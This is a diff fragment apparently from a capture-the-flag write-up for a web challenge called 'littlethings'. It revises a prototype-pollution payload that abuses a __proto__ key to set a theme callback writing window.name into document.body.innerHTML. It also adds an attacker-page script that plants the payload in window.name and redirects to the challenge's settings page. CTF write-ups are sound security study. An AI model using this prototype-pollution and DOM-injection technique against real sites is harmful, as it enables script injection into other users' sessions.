@@ -22,12 +22,17 @@ By making window.name to on our attacker site
 
 ```
 {
-   "__proto__": {},
-   "theme": {
-      "cb": "document.body.innerHTML=window.name.toString"
-   },
-   "anything": "<h1>Hi!</h1>"
+"__proto__": {"theme":{"cb":"document.body.innerHTML=window.name.valueOf"}}
 }
+=====
+<script>
+    x = `
+        <h1> Hello </h1>
+        
+    `
+    window.name = `{"x": ${JSON.stringify(x)}, "verbose": true, "showAll": true, "keepDebug": true, "__proto__": {"theme":{"cb":"document.body.innerHTML=window.name.valueOf"}}}`;
+    parent.location = 'https://littlethings.web.ctfcompetition.com/settings?__debug__';
+</script>
 ```
 
 and making him redirect to ctf chall,
